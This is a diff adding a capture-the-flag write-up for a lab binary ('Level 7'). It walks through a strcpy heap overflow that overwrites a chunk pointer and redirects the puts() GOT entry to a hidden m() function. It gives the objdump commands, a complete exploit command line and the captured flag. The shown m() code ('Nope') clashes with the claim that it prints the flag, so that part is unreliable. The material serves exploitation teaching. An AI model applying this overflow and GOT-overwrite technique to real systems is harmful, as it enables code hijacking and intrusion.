@@ -1,0 +1,106 @@
+# Level 7
+
+## Vulnerability
+Heap overflow with `strcpy()` overwriting pointers between heap chunks.
+
+## Code Analysis
+```c
+void m(void) {
+    puts("Nope");
+}
+
+void main(int argc, char **argv) {
+    int *struct1 = malloc(8);       // [value][data_ptr]
+    struct1[0] = 1;
+    struct1[1] = malloc(8);         // Allocate data buffer
+    
+    int *struct2 = malloc(8);       // [value][data_ptr]
+    struct2[0] = 2;
+    struct2[1] = malloc(8);         // Allocate data buffer
+    
+    strcpy(struct1[1], argv[1]);    // OVERFLOW: No bounds check!
+    strcpy(struct2[1], argv[2]);    // Writes to overwritten pointer!
+}
+```
+
+## Heap Layout
+```
+┌──────────────┐
+│ struct1      │ ← [value=1][data_ptr]
+├──────────────┤
+│ struct1.data │ ← 8 bytes buffer (argv[1] goes here)
+├──────────────┤
+│ struct2      │ ← [value=2][data_ptr]
+├──────────────┤
+│ struct2.data │ ← 8 bytes buffer (argv[2] goes here)
+└──────────────┘
+```
+
+## Solution Steps
+
+1. **Find target addresses**
+```bash
+   # Find GOT entry for puts()
+   objdump -R level7
+   # 08049928 R_386_JUMP_SLOT   puts
+   
+   # Find m() function
+   objdump -t level7 | grep " m"
+   # 080484f4 g     F .text    m
+```
+
+2. **Exploitation strategy**
+   - Overflow `argv[1]` to overwrite `struct2[1]` pointer
+   - Point `struct2[1]` to GOT entry of `puts()` (0x08049928)
+   - `argv[2]` will write to that GOT entry
+   - Overwrite `puts()` with address of `m()` (0x080484f4)
+
+3. **Calculate overflow**
+   - `struct1.data` buffer: 8 bytes
+   - Malloc metadata: 8 bytes
+   - `struct2` value field: 4 bytes
+   - Total padding: 8 + 8 + 4 = 20 bytes
+
+4. **Exploit**
+```bash
+   ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+```
+   - **Arg1**: `"A"*20 + "\x28\x99\x04\x08"`
+     - Fills buffer + metadata + struct2 value
+     - Overwrites `struct2[1]` with GOT address (0x08049928)
+   - **Arg2**: `"\xf4\x84\x04\x08"`
+     - Writes address of `m()` to `puts()` GOT entry
+
+5. **Get flag**
+```
+   5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
+
+## Attack Flow
+```
+Step 1: argv[1] overflow
+┌──────────────┐
+│ struct1      │
+├──────────────┤
+│ AAAAAAAA     │ ← argv[1] fills this
+├──────────────┤
+│ AAAAAAAA     │ ← Overflows into metadata
+├──────────────┤
+│ struct2      │
+│ [2][0x08049928] ← Overwrites data_ptr to GOT
+├──────────────┤
+
+Step 2: argv[2] write
+strcpy(0x08049928, "\xf4\x84\x04\x08")
+         ↓
+GOT[puts] = 0x080484f4 (m function)
+
+Step 3: Next puts() call
+puts() → GOT[0x08049928] → m() → prints flag!
+```
+
+## Key Concept
+**Heap Overflow + GOT Overwrite**: Chain two vulnerabilities:
+1. Overflow first buffer to control second buffer's pointer
+2. Use controlled pointer to perform arbitrary write to GOT
+3. Hijack library function to redirect to win function
